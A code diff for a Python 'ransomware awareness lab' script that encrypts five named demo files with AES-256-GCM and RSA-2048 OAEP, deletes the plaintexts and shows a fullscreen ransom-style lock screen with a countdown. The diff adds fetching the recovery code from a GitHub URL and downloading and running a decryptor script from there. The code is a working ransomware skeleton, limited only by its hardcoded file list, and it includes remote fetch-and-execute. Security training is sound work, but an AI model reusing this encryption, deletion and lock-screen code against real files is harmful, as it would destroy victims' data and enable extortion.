@@ -7,7 +7,9 @@ import shutil
 import subprocess
 import sys
 import tkinter as tk
-from urllib.request import urlopen
+import time
+
+from urllib.request import Request, urlopen
 
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.PublicKey import RSA
@@ -18,28 +20,83 @@ from Cryptodome.Random import get_random_bytes
 # ============================================================
 # CONTROLLED RANSOMWARE AWARENESS LAB
 #
-# Only the five explicitly listed files inside
-# ~/Desktop/RansomDemo/targets are processed.
+# IMPORTANT:
+# This demo ONLY processes these five explicitly listed files
+# inside:
+#
+# ~/Desktop/RansomDemo/targets/
+#
+# No recursive filesystem scanning is performed.
 # ============================================================
 
-ROOT = Path.home() / "Desktop" / "RansomDemo"
 
-TARGET_DIR = ROOT / "targets"
-BACKUP_DIR = ROOT / ".safety_backup"
-RUNTIME_DIR = ROOT / ".runtime"
+ROOT = (
+    Path.home()
+    / "Desktop"
+    / "RansomDemo"
+)
 
-LOG_FILE = ROOT / "demo_log.txt"
-CHECKSUM_FILE = ROOT / "checksums.json"
+TARGET_DIR = (
+    ROOT
+    / "targets"
+)
 
-PRIVATE_KEY_FILE = RUNTIME_DIR / "private.pem"
-PUBLIC_KEY_FILE = RUNTIME_DIR / "public.pem"
-DECRYPTOR_FILE = RUNTIME_DIR / "demo_decrypt.py"
+BACKUP_DIR = (
+    ROOT
+    / ".safety_backup"
+)
+
+RUNTIME_DIR = (
+    ROOT
+    / ".runtime"
+)
+
+LOG_FILE = (
+    ROOT
+    / "demo_log.txt"
+)
+
+CHECKSUM_FILE = (
+    ROOT
+    / "checksums.json"
+)
+
+PRIVATE_KEY_FILE = (
+    RUNTIME_DIR
+    / "private.pem"
+)
+
+PUBLIC_KEY_FILE = (
+    RUNTIME_DIR
+    / "public.pem"
+)
+
+DECRYPTOR_FILE = (
+    RUNTIME_DIR
+    / "demo_decrypt.py"
+)
+
+
+# ============================================================
+# GITHUB URLS
+# ============================================================
 
 DECRYPTOR_URL = (
     "https://raw.githubusercontent.com/"
     "what0302/what0302.github.io/"
     "master/_posts/demo_decrypt.py"
 )
+
+RECOVERY_CODE_URL = (
+    "https://raw.githubusercontent.com/"
+    "what0302/what0302.github.io/"
+    "master/_posts/recovery_code.txt"
+)
+
+
+# ============================================================
+# DEMO TARGET FILES
+# ============================================================
 
 TARGET_FILES = [
     "personal_notes.txt",
@@ -49,7 +106,6 @@ TARGET_FILES = [
     "application.log",
 ]
 
-RECOVERY_CODE = "1234"
 
 MAGIC = b"UNTDEMO1"
 
@@ -57,10 +113,11 @@ COUNTDOWN_MINUTES = 30
 
 
 # ============================================================
-# BASIC UTILITIES
+# LOGGING
 # ============================================================
 
 def write_log(message):
+
     ROOT.mkdir(
         parents=True,
         exist_ok=True
@@ -70,35 +127,57 @@ def write_log(message):
         "%Y-%m-%d %H:%M:%S"
     )
 
-    line = f"{timestamp} {message}"
+    line = (
+        f"{timestamp} "
+        f"{message}"
+    )
 
     print(line)
 
     with LOG_FILE.open(
         "a",
         encoding="utf-8"
-    ) as f:
-        f.write(line + "\n")
+    ) as file:
 
+        file.write(
+            line + "\n"
+        )
+
+
+# ============================================================
+# SHA-256
+# ============================================================
 
 def sha256_file(path):
+
     digest = hashlib.sha256()
 
-    with path.open("rb") as f:
+    with path.open(
+        "rb"
+    ) as file:
+
         while True:
-            chunk = f.read(
+
+            chunk = file.read(
                 1024 * 1024
             )
 
             if not chunk:
                 break
 
-            digest.update(chunk)
+            digest.update(
+                chunk
+            )
 
     return digest.hexdigest()
 
 
+# ============================================================
+# DIRECTORIES
+# ============================================================
+
 def setup():
+
     TARGET_DIR.mkdir(
         parents=True,
         exist_ok=True
@@ -116,18 +195,23 @@ def setup():
 
 
 # ============================================================
-# RSA KEY GENERATION
+# RSA KEYS
 # ============================================================
 
 def generate_keys():
+
     if PRIVATE_KEY_FILE.exists():
+
         private_key = RSA.import_key(
             PRIVATE_KEY_FILE.read_bytes()
         )
 
         if not PUBLIC_KEY_FILE.exists():
+
             PUBLIC_KEY_FILE.write_bytes(
-                private_key.publickey().export_key()
+                private_key
+                .publickey()
+                .export_key()
             )
 
         write_log(
@@ -136,30 +220,40 @@ def generate_keys():
 
         return
 
+
     write_log(
         "[KEY] Generating RSA-2048 training key pair"
     )
+
 
     key = RSA.generate(
         2048
     )
 
+
     PRIVATE_KEY_FILE.write_bytes(
         key.export_key()
     )
 
+
     PUBLIC_KEY_FILE.write_bytes(
-        key.publickey().export_key()
+        key
+        .publickey()
+        .export_key()
     )
 
+
     try:
+
         os.chmod(
             PRIVATE_KEY_FILE,
             0o600
         )
 
     except OSError:
+
         pass
+
 
     write_log(
         "[KEY] RSA key pair generated"
@@ -167,36 +261,58 @@ def generate_keys():
 
 
 # ============================================================
-# SHA-256 BASELINE
+# ORIGINAL SHA-256 BASELINE
 # ============================================================
 
 def save_original_checksums():
+
     checksums = {}
 
+
     for filename in TARGET_FILES:
-        path = TARGET_DIR / filename
+
+        path = (
+            TARGET_DIR
+            / filename
+        )
+
 
         if not path.exists():
+
             write_log(
-                f"[HASH-ERROR] Missing source file: {filename}"
+                "[HASH-ERROR] "
+                f"Missing source file: {filename}"
             )
+
             continue
 
+
         if path.is_symlink():
+
             write_log(
-                f"[HASH-ERROR] Symlink rejected: {filename}"
+                "[HASH-ERROR] "
+                f"Symlink rejected: {filename}"
             )
+
             continue
+
 
         digest = sha256_file(
             path
         )
 
-        checksums[filename] = digest
+
+        checksums[
+            filename
+        ] = digest
+
 
         write_log(
-            f"[HASH-BEFORE] {filename} {digest}"
+            "[HASH-BEFORE] "
+            f"{filename} "
+            f"{digest}"
         )
+
 
     CHECKSUM_FILE.write_text(
         json.dumps(
@@ -206,56 +322,89 @@ def save_original_checksums():
         encoding="utf-8"
     )
 
+
     write_log(
-        "[HASH] SHA-256 baseline saved"
+        "[HASH] "
+        "SHA-256 baseline saved"
     )
 
 
 # ============================================================
-# ENCRYPTION
+# ENCRYPT ONE FILE
 # ============================================================
 
 def encrypt_file(filename):
-    source = TARGET_DIR / filename
 
-    encrypted = TARGET_DIR / (
-        filename + ".unt"
+    source = (
+        TARGET_DIR
+        / filename
     )
 
-    backup = BACKUP_DIR / filename
+    encrypted = (
+        TARGET_DIR
+        / (filename + ".unt")
+    )
+
+    backup = (
+        BACKUP_DIR
+        / filename
+    )
+
+    temporary = (
+        TARGET_DIR
+        / (filename + ".unt.tmp")
+    )
+
+
+    # --------------------------------------------------------
+    # SAFETY CHECKS
+    # --------------------------------------------------------
 
     if source.is_symlink():
+
         write_log(
-            f"[SKIP] Symlink rejected: {filename}"
+            "[SKIP] "
+            f"Symlink rejected: {filename}"
         )
 
         return False
+
 
     if not source.exists():
 
         if encrypted.exists():
+
             write_log(
-                f"[INFO] Already encrypted: {filename}"
+                "[INFO] "
+                f"Already encrypted: {filename}"
             )
 
             return True
 
+
         write_log(
-            f"[ERROR] Source file missing: {filename}"
+            "[ERROR] "
+            f"Source file missing: {filename}"
         )
 
         return False
 
-    # Avoid overwriting an existing encrypted file.
+
     if encrypted.exists():
 
         write_log(
-            f"[ERROR] Both original and .unt exist: {filename}"
+            "[ERROR] "
+            f"Both original and encrypted file exist: "
+            f"{filename}"
         )
 
         return False
 
-    # Keep the first clean copy for lab safety.
+
+    # --------------------------------------------------------
+    # SAFETY BACKUP
+    # --------------------------------------------------------
+
     if not backup.exists():
 
         shutil.copy2(
@@ -263,25 +412,49 @@ def encrypt_file(filename):
             backup
         )
 
+
         write_log(
-            f"[BACKUP] {filename}"
+            "[BACKUP] "
+            f"{filename}"
         )
 
-    plaintext = source.read_bytes()
+
+    # --------------------------------------------------------
+    # READ PLAINTEXT
+    # --------------------------------------------------------
+
+    plaintext = (
+        source.read_bytes()
+    )
+
+
+    # --------------------------------------------------------
+    # LOAD RSA PUBLIC KEY
+    # --------------------------------------------------------
 
     public_key = RSA.import_key(
         PUBLIC_KEY_FILE.read_bytes()
     )
 
-    # AES-256: 32-byte random key.
+
+    # --------------------------------------------------------
+    # RANDOM AES-256 KEY
+    # --------------------------------------------------------
+
     aes_key = get_random_bytes(
         32
     )
+
+
+    # --------------------------------------------------------
+    # AES-256-GCM
+    # --------------------------------------------------------
 
     aes_cipher = AES.new(
         aes_key,
         AES.MODE_GCM
     )
+
 
     ciphertext, tag = (
         aes_cipher.encrypt_and_digest(
@@ -289,10 +462,16 @@ def encrypt_file(filename):
         )
     )
 
+
+    # --------------------------------------------------------
+    # RSA-OAEP WRAP AES KEY
+    # --------------------------------------------------------
+
     rsa_cipher = PKCS1_OAEP.new(
         public_key,
         hashAlgo=SHA256
     )
+
 
     encrypted_aes_key = (
         rsa_cipher.encrypt(
@@ -300,20 +479,26 @@ def encrypt_file(filename):
         )
     )
 
-    temporary = TARGET_DIR / (
-        filename + ".unt.tmp"
-    )
 
     try:
-        with temporary.open("wb") as f:
 
-            # File identifier
-            f.write(
+        # ----------------------------------------------------
+        # BUILD .UNT FILE
+        # ----------------------------------------------------
+
+        with temporary.open(
+            "wb"
+        ) as file:
+
+
+            # MAGIC HEADER
+            file.write(
                 MAGIC
             )
 
-            # RSA-wrapped AES key
-            f.write(
+
+            # ENCRYPTED AES KEY LENGTH
+            file.write(
                 len(
                     encrypted_aes_key
                 ).to_bytes(
@@ -322,12 +507,15 @@ def encrypt_file(filename):
                 )
             )
 
-            f.write(
+
+            # ENCRYPTED AES KEY
+            file.write(
                 encrypted_aes_key
             )
 
-            # AES-GCM nonce
-            f.write(
+
+            # NONCE LENGTH
+            file.write(
                 len(
                     aes_cipher.nonce
                 ).to_bytes(
@@ -336,141 +524,302 @@ def encrypt_file(filename):
                 )
             )
 
-            f.write(
+
+            # NONCE
+            file.write(
                 aes_cipher.nonce
             )
 
-            # GCM authentication tag
-            f.write(
-                len(tag).to_bytes(
+
+            # TAG LENGTH
+            file.write(
+                len(
+                    tag
+                ).to_bytes(
                     1,
                     "big"
                 )
             )
 
-            f.write(
+
+            # TAG
+            file.write(
                 tag
             )
 
-            # Ciphertext
-            f.write(
+
+            # CIPHERTEXT
+            file.write(
                 ciphertext
             )
 
-        # Atomic move into final .unt name.
+
+        # ----------------------------------------------------
+        # ATOMIC FINALIZE
+        # ----------------------------------------------------
+
         os.replace(
             temporary,
             encrypted
         )
 
-        # Remove visible plaintext only after
-        # the encrypted file was successfully created.
+
+        # ----------------------------------------------------
+        # PLAINTEXT REMOVED ONLY AFTER .UNT CREATED
+        # ----------------------------------------------------
+
         source.unlink()
 
+
         write_log(
-            f"[ENCRYPTED] "
-            f"{filename} -> {filename}.unt"
+            "[ENCRYPTED] "
+            f"{filename} -> "
+            f"{filename}.unt"
         )
+
 
         return True
 
+
     except Exception as error:
 
+
         if temporary.exists():
+
             temporary.unlink()
 
+
         write_log(
-            f"[ENCRYPT-FAILED] "
-            f"{filename}: {error}"
+            "[ENCRYPT-FAILED] "
+            f"{filename}: "
+            f"{error}"
         )
+
 
         return False
 
 
+# ============================================================
+# ENCRYPT ALL FIVE FILES
+# ============================================================
+
 def encrypt_all():
+
     successful = 0
+
 
     for filename in TARGET_FILES:
 
         if encrypt_file(
             filename
         ):
+
             successful += 1
+
 
     return successful
 
 
+# ============================================================
+# VERIFY ENCRYPTED STATE
+# ============================================================
+
 def verify_encrypted_state():
+
     for filename in TARGET_FILES:
 
-        original = TARGET_DIR / filename
-
-        encrypted = TARGET_DIR / (
-            filename + ".unt"
+        original = (
+            TARGET_DIR
+            / filename
         )
+
+        encrypted = (
+            TARGET_DIR
+            / (filename + ".unt")
+        )
+
 
         if original.exists():
 
             write_log(
-                f"[VERIFY-ERROR] "
-                f"Plaintext still exists: {filename}"
+                "[VERIFY-ERROR] "
+                f"Plaintext remains: {filename}"
             )
 
             return False
+
 
         if not encrypted.exists():
 
             write_log(
-                f"[VERIFY-ERROR] "
-                f"Encrypted file missing: {filename}.unt"
+                "[VERIFY-ERROR] "
+                f"Encrypted file missing: "
+                f"{filename}.unt"
             )
 
             return False
 
+
     write_log(
-        "[VERIFY] All 5 demo files are encrypted"
+        "[VERIFY] "
+        "All 5 training files encrypted"
     )
+
 
     return True
 
 
 # ============================================================
-# DECRYPTOR DOWNLOAD
+# REMOTE RECOVERY CODE
+# ============================================================
+
+def get_remote_recovery_code():
+
+    # Timestamp is appended to reduce the chance
+    # of receiving a cached older value.
+
+    url = (
+        RECOVERY_CODE_URL
+        + "?t="
+        + str(
+            int(
+                time.time()
+            )
+        )
+    )
+
+
+    request = Request(
+        url,
+        headers={
+            "User-Agent":
+                "Security-Awareness-Lab/1.0",
+
+            "Cache-Control":
+                "no-cache",
+
+            "Pragma":
+                "no-cache",
+        }
+    )
+
+
+    with urlopen(
+        request,
+        timeout=10
+    ) as response:
+
+        raw = response.read()
+
+
+    code = (
+        raw
+        .decode(
+            "utf-8"
+        )
+        .strip()
+    )
+
+
+    if not code:
+
+        raise RuntimeError(
+            "Remote recovery code is empty"
+        )
+
+
+    # Basic sanity limit for the training code.
+    if len(code) > 64:
+
+        raise RuntimeError(
+            "Remote recovery code is invalid"
+        )
+
+
+    write_log(
+        "[RECOVERY] "
+        "Remote recovery code retrieved"
+    )
+
+
+    return code
+
+
+# ============================================================
+# DOWNLOAD DECRYPTOR
 # ============================================================
 
 def download_decryptor():
+
     write_log(
-        "[RECOVERY] Downloading recovery utility"
+        "[RECOVERY] "
+        "Downloading recovery utility"
     )
 
+
+    # Cache-busting timestamp
+    url = (
+        DECRYPTOR_URL
+        + "?t="
+        + str(
+            int(
+                time.time()
+            )
+        )
+    )
+
+
+    request = Request(
+        url,
+        headers={
+            "User-Agent":
+                "Security-Awareness-Lab/1.0",
+
+            "Cache-Control":
+                "no-cache",
+
+            "Pragma":
+                "no-cache",
+        }
+    )
+
+
     with urlopen(
-        DECRYPTOR_URL,
+        request,
         timeout=15
     ) as response:
 
         data = response.read()
 
+
     if len(data) < 100:
 
         raise RuntimeError(
-            "Downloaded recovery utility is unexpectedly small"
+            "Downloaded recovery utility "
+            "is unexpectedly small"
         )
 
-    temporary = RUNTIME_DIR / (
-        "demo_decrypt.py.tmp"
+
+    temporary = (
+        RUNTIME_DIR
+        / "demo_decrypt.py.tmp"
     )
+
 
     temporary.write_bytes(
         data
     )
+
 
     os.replace(
         temporary,
         DECRYPTOR_FILE
     )
 
+
     write_log(
-        "[RECOVERY] Recovery utility downloaded"
+        "[RECOVERY] "
+        "Recovery utility downloaded"
     )
 
 
@@ -479,31 +828,39 @@ def download_decryptor():
 # ============================================================
 
 def show_warning_window():
+
     root = tk.Tk()
+
 
     root.title(
         "Security Awareness Training"
     )
 
+
     root.configure(
         bg="#8b0000"
     )
+
 
     root.attributes(
         "-fullscreen",
         True
     )
 
+
     root.attributes(
         "-topmost",
         True
     )
 
-    # Safety exit for the controlled lab.
+
+    # Safety exit for training.
     root.bind(
         "<Escape>",
-        lambda event: root.destroy()
+        lambda event:
+            root.destroy()
     )
+
 
     end_time = (
         datetime.now()
@@ -512,9 +869,16 @@ def show_warning_window():
         )
     )
 
+
+    # ========================================================
+    # HEADER
+    # ========================================================
+
     header = tk.Label(
         root,
-        text="SECURITY AWARENESS TRAINING",
+        text=(
+            "SECURITY AWARENESS TRAINING"
+        ),
         font=(
             "Arial",
             30,
@@ -524,122 +888,162 @@ def show_warning_window():
         bg="#8b0000"
     )
 
+
     header.pack(
-        pady=(35, 5)
+        pady=(30, 4)
     )
+
 
     simulation_label = tk.Label(
         root,
-        text="CONTROLLED RANSOMWARE SIMULATION",
+        text=(
+            "CONTROLLED RANSOMWARE SIMULATION"
+        ),
         font=(
             "Arial",
-            18,
+            17,
             "bold"
         ),
         fg="yellow",
         bg="#8b0000"
     )
 
+
     simulation_label.pack(
-        pady=5
+        pady=4
     )
+
 
     title = tk.Label(
         root,
-        text="YOUR DEMO FILES HAVE BEEN ENCRYPTED",
+        text=(
+            "YOUR DEMO FILES "
+            "HAVE BEEN ENCRYPTED"
+        ),
         font=(
             "Arial",
-            36,
+            34,
             "bold"
         ),
         fg="white",
         bg="#8b0000"
     )
 
+
     title.pack(
-        pady=(25, 15)
+        pady=(20, 12)
     )
 
-    information = tk.Label(
+
+    info = tk.Label(
         root,
         text=(
             "5 / 5 training files encrypted\n\n"
             "Encryption: AES-256-GCM\n"
             "Key protection: RSA-2048 OAEP\n\n"
-            "Only the controlled RansomDemo training directory "
-            "was processed."
+            "Only files inside the controlled "
+            "RansomDemo training directory "
+            "were processed."
         ),
         font=(
             "Arial",
-            16
+            15
         ),
         fg="white",
         bg="#8b0000",
         justify="center"
     )
 
-    information.pack(
-        pady=10
+
+    info.pack(
+        pady=8
     )
+
+
+    # ========================================================
+    # TIMER
+    # ========================================================
 
     timer_title = tk.Label(
         root,
         text="TRAINING COUNTDOWN",
         font=(
             "Arial",
-            15,
+            14,
             "bold"
         ),
         fg="white",
         bg="#8b0000"
     )
 
+
     timer_title.pack(
-        pady=(10, 0)
+        pady=(8, 0)
     )
+
 
     timer_label = tk.Label(
         root,
         text="00:30:00",
         font=(
             "Courier",
-            44,
+            42,
             "bold"
         ),
         fg="yellow",
         bg="#8b0000"
     )
 
+
     timer_label.pack(
         pady=3
     )
 
-    # --------------------------------------------------------
+
+    # ========================================================
     # VIEW ENCRYPTED FILES
-    # --------------------------------------------------------
+    # ========================================================
 
     def view_files():
+
         write_log(
-            "[GUI] User opened encrypted files directory"
+            "[GUI] "
+            "Encrypted files directory opened"
         )
 
+
+        # Temporarily stop forcing this window
+        # above the file manager.
         root.attributes(
             "-topmost",
             False
         )
 
-        root.iconify()
 
-        subprocess.Popen(
-            [
-                "xdg-open",
-                str(TARGET_DIR)
-            ]
-        )
+        try:
+
+            subprocess.Popen(
+                [
+                    "xdg-open",
+                    str(
+                        TARGET_DIR
+                    )
+                ]
+            )
+
+        except Exception as error:
+
+            write_log(
+                "[GUI-ERROR] "
+                f"{error}"
+            )
+
 
     view_button = tk.Button(
         root,
-        text="VIEW ENCRYPTED FILES",
+        text=(
+            "VIEW ENCRYPTED FILES"
+        ),
         font=(
             "Arial",
             14,
@@ -650,130 +1054,246 @@ def show_warning_window():
         pady=6
     )
 
+
     view_button.pack(
         pady=8
     )
 
-    # --------------------------------------------------------
-    # RECOVERY CODE
-    # --------------------------------------------------------
+
+    # ========================================================
+    # RECOVERY CODE INPUT
+    # ========================================================
 
     code_label = tk.Label(
         root,
         text="RECOVERY CODE",
         font=(
             "Arial",
-            15,
+            14,
             "bold"
         ),
         fg="white",
         bg="#8b0000"
     )
 
+
     code_label.pack(
         pady=(5, 3)
     )
+
 
     code_entry = tk.Entry(
         root,
         font=(
             "Arial",
-            21
+            20
         ),
-        width=16,
+        width=18,
         justify="center",
         show="*"
     )
+
 
     code_entry.pack(
         pady=4
     )
 
+
     code_entry.focus_set()
+
 
     status_label = tk.Label(
         root,
         text="",
         font=(
             "Arial",
-            14,
+            13,
             "bold"
         ),
         fg="yellow",
         bg="#8b0000"
     )
 
+
     status_label.pack(
         pady=6
     )
 
+
+    # ========================================================
+    # RECOVERY PROCESS
+    # ========================================================
+
     def recover():
-        code = (
+
+        entered_code = (
             code_entry
             .get()
             .strip()
         )
 
-        if code != RECOVERY_CODE:
 
-            write_log(
-                "[RECOVERY] Invalid recovery code entered"
-            )
+        if not entered_code:
 
             status_label.config(
-                text="INVALID RECOVERY CODE"
+                text=(
+                    "ENTER A RECOVERY CODE"
+                )
             )
+
+            return
+
+
+        status_label.config(
+            text=(
+                "VALIDATING RECOVERY CODE..."
+            )
+        )
+
+
+        root.update_idletasks()
+
+
+        write_log(
+            "[RECOVERY] "
+            "Recovery code validation requested"
+        )
+
+
+        # ----------------------------------------------------
+        # FETCH CURRENT CODE FROM GITHUB
+        # ----------------------------------------------------
+
+        try:
+
+            remote_code = (
+                get_remote_recovery_code()
+            )
+
+        except Exception as error:
+
+            write_log(
+                "[RECOVERY-ERROR] "
+                "Unable to retrieve remote code: "
+                f"{error}"
+            )
+
+
+            status_label.config(
+                text=(
+                    "UNABLE TO CONTACT "
+                    "RECOVERY SERVER"
+                )
+            )
+
+            return
+
+
+        # ----------------------------------------------------
+        # COMPARE ENTERED VS REMOTE
+        # ----------------------------------------------------
+
+        if entered_code != remote_code:
+
+            write_log(
+                "[RECOVERY] "
+                "Invalid recovery code entered"
+            )
+
+
+            status_label.config(
+                text=(
+                    "INVALID RECOVERY CODE"
+                )
+            )
+
 
             code_entry.delete(
                 0,
                 tk.END
             )
 
+
             return
 
+
+        # ----------------------------------------------------
+        # CODE MATCHED
+        # ----------------------------------------------------
+
         write_log(
-            "[RECOVERY] Valid recovery code accepted"
+            "[RECOVERY] "
+            "Remote recovery code validated"
         )
 
+
         status_label.config(
-            text="RECOVERY CODE ACCEPTED"
+            text=(
+                "RECOVERY CODE ACCEPTED"
+            )
         )
+
 
         root.update_idletasks()
 
+
+        # ----------------------------------------------------
+        # DOWNLOAD AND START DECRYPTOR
+        # ----------------------------------------------------
+
         try:
+
             status_label.config(
-                text="DOWNLOADING RECOVERY UTILITY..."
+                text=(
+                    "DOWNLOADING "
+                    "RECOVERY UTILITY..."
+                )
             )
 
+
             root.update_idletasks()
+
 
             download_decryptor()
 
+
             status_label.config(
-                text="STARTING FILE RECOVERY..."
+                text=(
+                    "STARTING FILE RECOVERY..."
+                )
             )
 
+
             root.update_idletasks()
+
 
             subprocess.Popen(
                 [
                     sys.executable,
-                    str(DECRYPTOR_FILE)
+                    str(
+                        DECRYPTOR_FILE
+                    )
                 ]
             )
 
+
             write_log(
-                "[RECOVERY] Recovery utility launched"
+                "[RECOVERY] "
+                "Recovery utility launched"
             )
 
+
+            # Close warning GUI.
             root.destroy()
+
 
         except Exception as error:
 
             write_log(
-                f"[RECOVERY-ERROR] {error}"
+                "[RECOVERY-ERROR] "
+                f"{error}"
             )
+
 
             status_label.config(
                 text=(
@@ -782,7 +1302,8 @@ def show_warning_window():
                 )
             )
 
-    recovery_button = tk.Button(
+
+    recover_button = tk.Button(
         root,
         text="RECOVER FILES",
         font=(
@@ -795,14 +1316,22 @@ def show_warning_window():
         pady=7
     )
 
-    recovery_button.pack(
+
+    recover_button.pack(
         pady=7
     )
 
+
     code_entry.bind(
         "<Return>",
-        lambda event: recover()
+        lambda event:
+            recover()
     )
+
+
+    # ========================================================
+    # FOOTER
+    # ========================================================
 
     footer = tk.Label(
         root,
@@ -813,26 +1342,30 @@ def show_warning_window():
         ),
         font=(
             "Arial",
-            12
+            11
         ),
         fg="white",
         bg="#8b0000"
     )
 
+
     footer.pack(
         side="bottom",
-        pady=15
+        pady=12
     )
 
-    # --------------------------------------------------------
+
+    # ========================================================
     # COUNTDOWN
-    # --------------------------------------------------------
+    # ========================================================
 
     def update_timer():
+
         remaining = (
             end_time
             - datetime.now()
         )
+
 
         seconds = max(
             0,
@@ -841,46 +1374,61 @@ def show_warning_window():
             )
         )
 
+
         hours = (
             seconds // 3600
         )
+
 
         minutes = (
             seconds % 3600
         ) // 60
 
-        secs = (
+
+        seconds_remaining = (
             seconds % 60
         )
+
 
         timer_label.config(
             text=(
                 f"{hours:02d}:"
                 f"{minutes:02d}:"
-                f"{secs:02d}"
+                f"{seconds_remaining:02d}"
             )
         )
 
+
         if seconds > 0:
+
             root.after(
                 1000,
                 update_timer
             )
 
         else:
+
             status_label.config(
-                text="TRAINING TIMER EXPIRED"
+                text=(
+                    "TRAINING TIMER EXPIRED"
+                )
             )
 
+
             write_log(
-                "[GUI] Training countdown expired"
+                "[GUI] "
+                "Training countdown expired"
             )
+
 
     update_timer()
 
+
     write_log(
-        "[GUI] Warning screen displayed"
+        "[GUI] "
+        "Warning screen displayed"
     )
+
 
     root.mainloop()
 
@@ -890,46 +1438,159 @@ def show_warning_window():
 # ============================================================
 
 def main():
+
     setup()
+
 
     write_log(
         "=================================================="
     )
 
+
     write_log(
-        "[START] Ransomware awareness simulation started"
+        "[START] "
+        "Ransomware awareness simulation started"
     )
+
+
+    # --------------------------------------------------------
+    # MAKE SURE ALL 5 SOURCE FILES EXIST BEFORE STARTING
+    # --------------------------------------------------------
+
+    missing = []
+
+
+    for filename in TARGET_FILES:
+
+        path = (
+            TARGET_DIR
+            / filename
+        )
+
+        encrypted = (
+            TARGET_DIR
+            / (filename + ".unt")
+        )
+
+
+        if (
+            not path.exists()
+            and
+            not encrypted.exists()
+        ):
+
+            missing.append(
+                filename
+            )
+
+
+    if missing:
+
+        write_log(
+            "[ABORT] "
+            "Required training files are missing: "
+            + ", ".join(
+                missing
+            )
+        )
+
+
+        print()
+
+        print(
+            "Required demo files are missing:"
+        )
+
+
+        for filename in missing:
+
+            print(
+                f" - {filename}"
+            )
+
+
+        return
+
+
+    # --------------------------------------------------------
+    # GENERATE / LOAD RSA
+    # --------------------------------------------------------
 
     generate_keys()
 
-    save_original_checksums()
 
-    successful = encrypt_all()
+    # --------------------------------------------------------
+    # SAVE HASHES ONLY WHEN PLAINTEXT FILES ARE PRESENT
+    # --------------------------------------------------------
+
+    plaintext_count = sum(
+        1
+        for filename in TARGET_FILES
+        if (
+            TARGET_DIR
+            / filename
+        ).exists()
+    )
+
+
+    if plaintext_count > 0:
+
+        save_original_checksums()
+
+
+    # --------------------------------------------------------
+    # ENCRYPT
+    # --------------------------------------------------------
+
+    successful = (
+        encrypt_all()
+    )
+
 
     write_log(
-        f"[STATUS] Encryption completed: "
-        f"{successful}/{len(TARGET_FILES)}"
+        "[STATUS] "
+        f"Encryption status: "
+        f"{successful}/"
+        f"{len(TARGET_FILES)}"
     )
+
+
+    # --------------------------------------------------------
+    # VERIFY
+    # --------------------------------------------------------
 
     if not verify_encrypted_state():
 
         write_log(
-            "[ABORT] Encryption state incomplete"
+            "[ABORT] "
+            "Encrypted state verification failed"
         )
+
 
         print()
-        print(
-            "Not all demo files were encrypted."
-        )
 
         print(
-            "The warning screen will not be displayed."
+            "Not all training files "
+            "are encrypted."
         )
+
+
+        print(
+            "Warning GUI will not "
+            "be displayed."
+        )
+
 
         return
+
+
+    # --------------------------------------------------------
+    # GUI
+    # --------------------------------------------------------
 
     show_warning_window()
 
 
 if __name__ == "__main__":
+
     main()
